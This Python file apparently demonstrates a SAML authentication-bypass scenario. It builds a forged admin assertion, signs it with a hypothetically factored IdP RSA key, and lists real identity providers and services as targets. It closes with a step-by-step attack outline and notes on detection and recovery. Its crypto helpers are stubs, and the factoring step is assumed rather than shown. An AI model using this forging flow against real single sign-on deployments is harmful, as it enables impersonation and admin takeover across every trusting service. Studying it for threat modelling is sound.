"""
assertion_forge.py

SAML 2.0 assertion builder + XMLDSig signing surface for a
ruby-saml / lasso / pysaml2 Service Provider. Demonstrates the
complete flow from IdP metadata (which publishes the RSA signing
cert) to a forged SAML Response that the SP accepts as a valid
admin login.

Targets: Okta, Azure AD (Entra ID), Shibboleth, ADFS, Keycloak
— any IdP that uses RSA-SHA1 or RSA-SHA256 to sign assertions.
SP side: Salesforce, GitHub Enterprise, AWS IAM SAML, Jira/
Confluence, Workday, ServiceNow.
"""

from dataclasses import dataclass
from xml.etree import ElementTree as ET
import base64
import hashlib
import time
import uuid

NS = {
    "saml": "urn:oasis:names:tc:SAML:2.0:assertion",
    "samlp": "urn:oasis:names:tc:SAML:2.0:protocol",
    "ds":    "http://www.w3.org/2000/09/xmldsig#",
}


@dataclass
class IdPMetadata:
    """Pulled from https://idp.example.com/saml/metadata — public."""
    entity_id: str
    sso_url: str
    signing_cert_pem: str    # <-- RSA-2048 public key; factoring input


@dataclass
class SamlAssertion:
    issuer: str              # IdP entity ID
    name_id: str             # "admin@example.com" — any identity
    name_id_format: str      # urn:oasis:names:tc:SAML:2.0:nameid-format:emailAddress
    audience: str            # SP entity ID
    authn_instant: str
    session_not_on_or_after: str
    attributes: dict         # {"Role": ["admin"], "groups": ["wheel"]}
    assertion_id: str
    response_id: str


def build_assertion_xml(a: SamlAssertion) -> str:
    """Build a minimal but valid SAML 2.0 Response + Assertion."""
    now = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    later = time.strftime(
        "%Y-%m-%dT%H:%M:%SZ",
        time.gmtime(time.time() + 300))

    assertion = f"""<saml:Assertion xmlns:saml="{NS['saml']}"
      ID="{a.assertion_id}" IssueInstant="{now}" Version="2.0">
  <saml:Issuer>{a.issuer}</saml:Issuer>
  <saml:Subject>
    <saml:NameID Format="{a.name_id_format}">{a.name_id}</saml:NameID>
    <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
      <saml:SubjectConfirmationData NotOnOrAfter="{later}"
        Recipient="{a.audience}"/>
    </saml:SubjectConfirmation>
  </saml:Subject>
  <saml:Conditions NotBefore="{now}" NotOnOrAfter="{later}">
    <saml:AudienceRestriction>
      <saml:Audience>{a.audience}</saml:Audience>
    </saml:AudienceRestriction>
  </saml:Conditions>
  <saml:AuthnStatement AuthnInstant="{a.authn_instant}"
    SessionNotOnOrAfter="{a.session_not_on_or_after}">
    <saml:AuthnContext>
      <saml:AuthnContextClassRef>
        urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport
      </saml:AuthnContextClassRef>
    </saml:AuthnContext>
  </saml:AuthnStatement>
  <saml:AttributeStatement>"""
    for k, vals in a.attributes.items():
        assertion += f"""
    <saml:Attribute Name="{k}">"""
        for v in vals:
            assertion += f"""
      <saml:AttributeValue>{v}</saml:AttributeValue>"""
        assertion += """
    </saml:Attribute>"""
    assertion += """
  </saml:AttributeStatement>
</saml:Assertion>"""

    response = f"""<samlp:Response xmlns:samlp="{NS['samlp']}"
  ID="{a.response_id}" InResponseTo="_request" Version="2.0"
  IssueInstant="{now}" Destination="{a.audience}">
  <saml:Issuer xmlns:saml="{NS['saml']}">{a.issuer}</saml:Issuer>
  <samlp:Status><samlp:StatusCode
    Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>
  {assertion}
</samlp:Response>"""
    return response


def sign_assertion(xml: str, rsa_private_key) -> str:
    """XMLDSig enveloped signature using RSA-SHA256.

    In real ruby-saml / ADFS / Okta the IdP signs the
    <saml:Assertion> element with an enveloped <ds:Signature>.
    The SP looks up the signing cert from IdP metadata and calls
    xmlsec1 or OpenSSL to verify.

    An attacker with the factored IdP RSA private key produces
    a signature that is indistinguishable from the real IdP's.
    """
    # Canonicalize (C14N exclusive) the assertion
    canon = c14n_exclusive(xml, "saml:Assertion")
    digest = base64.b64encode(hashlib.sha256(canon).digest()).decode()

    signed_info = f"""<ds:SignedInfo xmlns:ds="{NS['ds']}">
  <ds:CanonicalizationMethod
    Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
  <ds:SignatureMethod
    Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
  <ds:Reference URI="#{extract_assertion_id(xml)}">
    <ds:Transforms>
      <ds:Transform
        Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
      <ds:Transform
        Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
    </ds:Transforms>
    <ds:DigestMethod
      Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
    <ds:DigestValue>{digest}</ds:DigestValue>
  </ds:Reference>
</ds:SignedInfo>"""

    si_canon = c14n_exclusive(signed_info)
    sig_value = rsa_sign_sha256(rsa_private_key, si_canon)

    return inject_signature(xml, signed_info,
                            base64.b64encode(sig_value).decode())


# ---- Stubs for crypto / XML plumbing --------------------------
def c14n_exclusive(xml, element=None): ...
def extract_assertion_id(xml): ...
def rsa_sign_sha256(key, data): ...
def inject_signature(xml, si, sv): ...


# ---- Attack summary ------------------------------------------
# 1. Fetch IdP metadata XML (unauthenticated, public).
# 2. Extract RSA-2048 signing certificate.
# 3. Factor the modulus.
# 4. build_assertion_xml() with name_id = "ceo@corp.com",
#    attributes = {"Role": ["admin"]}.
# 5. sign_assertion() with the recovered private key.
# 6. POST the base64-encoded Response to the SP's ACS URL.
# 7. SP validates the XMLDSig against the IdP's known cert,
#    creates a session for "ceo@corp.com" with admin role.
#
# Every SP trusting that IdP is compromised simultaneously.
# Detection: SP-side anomaly detection on assertion velocity
# or geo; but the signature is cryptographically perfect.
# Recovery: IdP rotates signing key + every SP updates
# metadata. Multi-hour for cloud IdPs (Okta, Entra); days
# to months for on-prem ADFS + legacy SP integrations.
